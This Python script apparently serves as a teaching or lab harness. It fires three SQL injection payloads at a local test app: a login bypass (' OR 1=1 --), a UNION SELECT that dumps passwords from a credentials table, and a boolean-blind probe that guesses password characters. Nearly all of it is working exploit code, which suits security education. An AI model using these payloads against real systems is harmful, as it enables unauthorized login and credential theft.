import requests
import re
import json
import sys

def authentication_based():

    url = 'http://127.0.0.1:5000/login'

    payload = {'username': "' OR 1=1 --", 
               'password': 'who cares'}
    try:
        r = requests.post(url, data=payload)
    except requests.exceptions.RequestException as e:
        return {"error": f"Request failed: {str(e)}"}
    vulnerable = 'Login Successfull!' in r.text

    if r.text.startswith('DB_ERROR'):
        return {
            "kind": "err",
            "username": payload['username'],
            "password": payload['password'],
            "text": r.text,
            "explain": "The query broke instead of returning a result — likely a syntax issue in the payload."
        }

    return {
        "kind": "true" if vulnerable else "false",
        "username": payload['username'],
        "password": payload['password'],
        "vulnerable": vulnerable,
        "text": "Login Successfull!" if vulnerable else "Password or Username is incorrect.",
        "explain": "The server logged the request in as a real user — with made-up credentials." if vulnerable
        else "This payload didn't bypass the login mechanism."
    } 

def union_based():

    url = 'http://127.0.0.1:5000/search'

    payload = {"keyword" : "1' UNION SELECT password FROM credentials --"}
    try:
        r_union = requests.post(url, data=payload)
    #For Socket, Network Type Errors
    except requests.exceptions.RequestException as e:
        return {
            "error": f"Request failed: {str(e)}",
            "payload": payload['keyword'],
            "passwords": [],
        }
    
    if r_union.status_code != 200:
        return {
            "error": f"Request failed: {str(r_union.status_code)}",
            "payload": payload['keyword'],
            "passwords": []
            }
    
    passwords = re.findall(r'<li>(.*?)</li>',r_union.text)

    return {
            "payload": payload['keyword'], 
            "passwords": passwords
    }

def boolean_based():
    url = 'http://127.0.0.1:5000/check'

    
    user = "Hello"
    char = 'H'
    position = 1

    # If AND condition true it will return complete true and we will understand a is the first letter.
    payload = f"{user}' AND (SELECT SUBSTR(password, {position},{position}) FROM credentials WHERE username = '{user}') = '{char}' --"


    payload_dict = {
        "user" : user,
        "char" : char,
        "payload" : payload,
        "position" : position
    }

    try:
        r = requests.get(url, params={'username' : payload})

    except requests.exceptions.RequestException as e:
        return {
            "error": f"Request failed: {str(e)}",
            "kind": "err",
            **payload_dict,
        }

    
    if r.status_code != 200:
        return {
            "error": f"Unexpected status code: {r.status_code}",
            "kind": "err",
            **payload_dict,
        }

    if r.text == "User Exist.":
        return {
            "kind" : "true",
            **payload_dict, 
            "text" : "The User Exist.",
            "explain" : f"True — that confirms {user} exists and letter #1 of their password is {char}"
        }
    
    if r.text == "User could not found.":
        return {
            "kind" : "false",
            **payload_dict,
            "text" : "The User not Exist.",
            "explain" : f"False — either {user} doesn't exist, or letter #1 isn't {char}. One answer can't tell which." 
        }

    if r.text.startswith("DB_ERROR"):
        return {
            "kind" : "err",
            **payload_dict,
            "text" : "A database error Occurred.",
            "explain" : "The query broke instead of answering true or false — likely a syntax issue in the payload." 
        }
    return {
      "kind": 'err',
      **payload_dict,
      "text": '(no output)',
      "explain": 'Unexpected response — check that the server is running.'
    }


if __name__ == "__main__":
    test_name = sys.argv[1] if len(sys.argv) > 1 else "auth"

    if test_name == "auth":
        print(json.dumps(authentication_based()))
    elif test_name == "boolean":
        result = boolean_based()
        print(json.dumps(result))
    elif test_name == "union":
        print(json.dumps(union_based()))



